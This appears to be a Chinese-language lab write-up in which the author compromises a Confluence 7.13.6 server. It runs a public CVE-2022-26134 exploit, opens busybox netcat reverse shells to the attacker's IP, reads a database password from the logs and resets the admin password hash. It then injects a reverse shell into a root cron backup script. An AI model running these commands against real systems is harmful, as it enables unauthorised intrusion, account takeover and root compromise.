针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.190.41
```

![image-20241201142752981](https://s2.loli.net/2024/12/01/VkOnMJjDWpNTiK3.png)

针对开放的端口进行相应的服务探测

```
sudo nmap -p22,8090,8091 -A 192.168.190.41 -oG Flu.txt
```

![image-20241201143001418](https://s2.loli.net/2024/12/01/bWUViyP9CfYdL2J.png)

22端口没有可以直接利用的情况，我们优先查看8090端口的相关服务内容

![image-20241201152535433](https://s2.loli.net/2024/12/01/VyNgoe5iBwZsMpr.png)

根据HTTP服务的显示应当是confluence的服务，同时能够看到对应的版本为7.13.6，搜索对应的版本是否有漏洞可以进行利用，经过搜索发现一个可以利用的漏洞CVD-2022-26134

![image-20241201153837801](https://s2.loli.net/2024/12/01/eBK5bn27IoRrlfA.png)

我们使用该漏洞来进行相应的远程命令执行(https://github.com/nxtexploit/CVE-2022-26134.git)

```
python3 CVE-2022-26134.py http://192.168.190.41:8090 "id"
```

![image-20241201154226907](https://s2.loli.net/2024/12/01/gcVxG9Mi4WZA1Ct.png)

执行成功，下一步我们让目标服务器反弹一个shell到本机

```
python3 CVE-2022-26134.py http://192.168.190.41:8090 "busybox nc 192.168.45.197 443 -e bash"
```

![image-20241201154446491](https://s2.loli.net/2024/12/01/lGpHdwSA6U7yhtC.png)

成功获取相应的shell，进行相应的升级和持久化

![image-20241201154920876](https://s2.loli.net/2024/12/01/caJw3VsRKPSvBMd.png)

在home/confluence目录下获取第一个flag，接下来我们需要进行提权

/opt/atlassian/confluence/logs/

/opt/atlassian/confluence/temp

/opt/atlassian/confluence/conf/tomcat-users.xml

/opt/atlassian/confluence/bin

我们在logs目录下找到了一行内容，里面包含了相应的一个数据库账号密码

![image-20241201163526231](https://files.seeusercontent.com/2026/04/08/0dbW/image-20241201163526231.png)

![image-20241201162414713](https://s2.loli.net/2024/12/01/m2crVpzSqPwkDYi.png)

找到一个密码

userName=confluence

dbConfigInfo.password=HoldingOn12

貌似是一个DB的账号密码，我们可以看到本地开启了3306端口，我们尝试登录数据库

```
mysql -u confluence -p
```

![image-20241201162552855](https://s2.loli.net/2024/12/01/ZoT3DGw9lr18Yeu.png)

成功登入；

```
select * from cwd_user;
```

![image-20241201162829311](https://s2.loli.net/2024/12/01/6pl3RYJZFxvbEkC.png)

我们通过搜索找到了这篇文章来描述该情况如何进行下一步操作，描述破解这个密码比较难，但可以修改密码为简单密码（https://blog.csdn.net/weixin_39251927/article/details/127883324）

我们选择123456的密文

{PKCS5S2}UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm

备份admin的密文

{PKCS5S2}MCB0MaBA39GjOQb3wG0ioM7w+pPdQXdy5GskVAtS5/Ef0fCnvr8jPMdZ2CDhM0ke

```
update cwd_user set credential = '{PKCS5S2}UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm' where id=458753
```

![image-20241201163318233](https://s2.loli.net/2024/12/01/s3YufjRiqxKgldh.png)

可以看到密码已经被修改，我们尝试下登录confluence后台

user：admin

password：123456

![image-20241201163604090](https://s2.loli.net/2024/12/01/dJpjNB5I2UmwxHW.png)

成功进行了登录操作，参考文章（https://miaotony.xyz/2023/05/30/Pentest_2023ShanghaiPanshixingdong/）

到这一步我们无法获取能够进一步提权的内容，我们考虑上传pspy查看进程中是否有可以利用的内容

![image-20241201170751879](https://s2.loli.net/2024/12/01/CXikz5roDu2hnev.png)

等了一会发现系统发起了一个备份任务，应当是root的crontab

![image-20241201170857565](https://s2.loli.net/2024/12/01/mIw7GRiSyB6urNx.png)

这个文件目前我们的用户有权限能够编辑，我们添加一行shell反弹脚本，

```
echo 'busybox nc 192.168.45.197 4444 -e bash' >> /opt/log-backup.sh
```

![image-20241201171116860](https://s2.loli.net/2024/12/01/w6e29Y8zZbiWAcQ.png)
